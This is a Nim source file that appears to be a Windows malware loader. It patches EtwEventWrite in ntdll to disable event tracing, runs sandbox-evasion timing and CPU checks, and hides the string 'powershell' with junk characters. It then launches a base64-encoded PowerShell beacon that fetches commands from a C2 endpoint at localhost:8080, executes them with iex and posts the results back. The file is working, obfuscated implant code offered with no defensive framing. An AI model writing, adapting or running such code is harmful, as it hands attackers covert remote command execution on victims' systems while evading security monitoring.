
import std/[times, os]
import std/httpclient
import osproc
import std/strutils
import winim/lean
import strformat
import dynlib
import winim

when defined amd64:
    echo "[*] Running in x64 process"
    const patch: array[1, byte] = [byte 0xc3]
elif defined i386:
    echo "[*] Running in x86 process"
    const patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
proc wwlwnv(): void = 
  let lywKaM = cpuTime()
  sleep(3000) 

  if(cpuTime() - lywKaM<3):
     quit()
  discard

proc BBLXht(): void =
  if countProcessors() < 4:
    quit()

proc oLlZiU(): void= 
  var qsUhaz = newHttpClient()
  var pWbiCc = qsUhaz.getContent("https://google.com")

proc Patchntdll(): bool =
    var
        ntdll: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    ntdll = loadLib("ntdll")
    if isNil(ntdll):
        echo "[X] Failed to load ntdll.dll"
        return disabled

    cs = ntdll.symAddr("EtwEventWrite") # equivalent of GetProcAddress()
    if isNil(cs):
        echo "[X] Failed to get the address of 'EtwEventWrite'"
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        echo "[*] Applying patch"
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true

    return disabled





when isMainModule:
    var success = Patchntdll()
    echo fmt"[*] ETW blocked by patch: {bool(success)}"
    wwlwnv()
    BBLXht()
    oLlZiU()
    var USTdtl = "pБoБwБeБrБsБhБeБlБlБ".replace("Б","")
    var EhVLZT = "-БnБoБpБrБoБfБiБlБeБ".replace("Б","")
    var yYBFdF = "-ЖnЖoЖlЖoЖgЖoЖ".replace("Ж","")
    let PLeUzS = execCmd("$# $# $# -c iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('CiAgICBmdU5DdGlPbiBlZmtLaE0gewogICAgICAgIAogICAgICAgICRCTUdrU3QgPSBJTnZPa2Utd0VCcmVxdUVTdCAiaHR0cDovL2xvY2FsaG9zdDo4MDgwL2dldGNvbW1hbmQvblFhQVVTIiAtSGVhZGVycyBAeyJBdXRob3JpemF0aW9uIj0iMzY5NCJ9ICAKICAgICAgICBSZXR1Uk4gJEJNR2tTdC5jT250RW50IAogICAgfQogICAgZnVOQ3RpT24gRnloWFRMKFtzdHJpbmddJHdCUk1VQil7CiAgICAgICAgJHdCUk1VQiAgPShpZXggJHdCUk1VQiAyPiYxIHwgT3V0LVN0cmluZyApCiAgICAgICAgUmV0dVJOICR3QlJNVUIKICAgIH0KICAgIGZ1TkN0aU9uIE1XQmRIRChbc3RyaW5nXSR3QlJNVUIpewogICAgCgogICAgICAgICRTaUpXYU8gPSBAe2lTelRycT0kd0JSTVVCfQogICAgICAgICRyZXEgPSBJTnZPa2Utd0VCcmVxdUVTdCAiaHR0cDovL2xvY2FsaG9zdDo4MDgwL3Jlc3BvbnNlL0hzSGNlaCIgLUhlYWRlcnMgQHsiQXV0aG9yaXphdGlvbiI9IjM2OTQifSAtTWV0aG9kIFBPU1QgLUJvZHkgJFNpSldhTyAKICAgIH0KICAgICRCVVFRTlcgPSAxCiAgICAKICAgIHdoaUxlICgkQlVRUU5XIC1MZSA1IC1hbkQgJEJVUVFOVyAtTmUgMykKICAgIHsKICAgICAgICAkd0JSTVVCID0gZWZrS2hNCiAgICAgICAgaWYoJHdCUk1VQi5UcmltKCkgLWVRICJub25lIil7CiAgICAgICAgU3RhcnQtYFNgTGBFYEVwIC1zIDEKICAgIAogICAgICAgIH0KICAgICAgICBlTHNlewogICAgICAgICR3QlJNVUIgPSBGeWhYVEwoJHdCUk1VQikKICAgICAgICBNV0JkSEQoJHdCUk1VQikKICAgIAogICAgICAgIH0KICAgICAgICAKICAgICAgICBTdGFydC1gU2BMYEVgRXAgLXMgMQogICAgfQogICAg')))" % [USTdtl,EhVLZT,yYBFdF])
    
    